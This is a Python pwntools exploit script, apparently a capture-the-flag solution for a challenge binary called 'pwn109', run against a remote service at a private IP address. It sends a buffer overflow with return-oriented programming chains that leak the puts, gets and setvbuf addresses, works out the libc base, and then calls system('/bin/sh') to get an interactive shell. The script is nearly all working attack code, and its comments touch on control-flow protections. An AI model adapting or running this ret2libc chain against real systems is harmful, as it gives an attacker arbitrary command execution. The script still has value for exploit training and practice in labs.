from pwn import *

PROGRAM = './pwn109-1644300507645.pwn109'
context.binary = e = ELF(PROGRAM)
# libc = ELF('./libc.so.6')
libc = ELF('./libc6_2.31-0ubuntu9.9_amd64.so')

# io = process(PROGRAM)
io = remote('10.49.162.10', '9009')

offset = 40

# print(io.recv().decode('utf-8'))
# IBT only works with indirect jmp/call, indirect means the target address is compute at runtime
# if the target start with ENDBR64, its fine, otherwise ur cooked
# SHSTK deals with ret, it check rip and copy of it earlier, if not rewrited using bof fine, otherwise ur cooked

rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = (rop.find_gadget(['ret']))[0]

# payload = flat(
#     b'A' * 40,
#     # ret,
#     pop_rdi,
#     e.got['puts'],
#     e.plt['puts'],
#     e.symbols['main']
# )

# payload = b'A' * offset + p64(pop_rdi) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

# leaking puts address
rop.call(e.symbols['puts'], [e.got['puts']])
rop.call(e.symbols['main'])

payload = [
    b'A' * offset,
    rop.chain()
]

payload = b''.join(payload)

io.recv()
io.sendline(payload)

leak_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts@libc = {hex(leak_puts)}")

# leaking gets address
rop = ROP(e)
rop.call(e.symbols['puts'], [e.got['gets']])
rop.call(e.symbols['main'])

payload = flat(
    b'A' * offset,
    rop.chain()
)

io.recv()
io.sendline(payload)

leak_gets = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f"gets@libc: {hex(leak_gets)}")

# leaking setvbuf address
rop = ROP(e)
rop.call(e.symbols['puts'], [e.got['setvbuf']])
rop.call(e.symbols['main'])

payload = flat(
    b'A' * offset,
    rop.chain()
)

io.recv()
io.sendline(payload)

leak_setvbuf = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f"setvbuf@libc: {hex(leak_setvbuf)}")

libc.address = leak_gets - libc.symbols['gets']
log.success(f"libc = {hex(libc.address)}")

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

# Lets play wkwkwk
payload = flat(
    b'A' * 40,
    ret,
    rop.chain()
)

io.sendline(payload)
io.interactive()
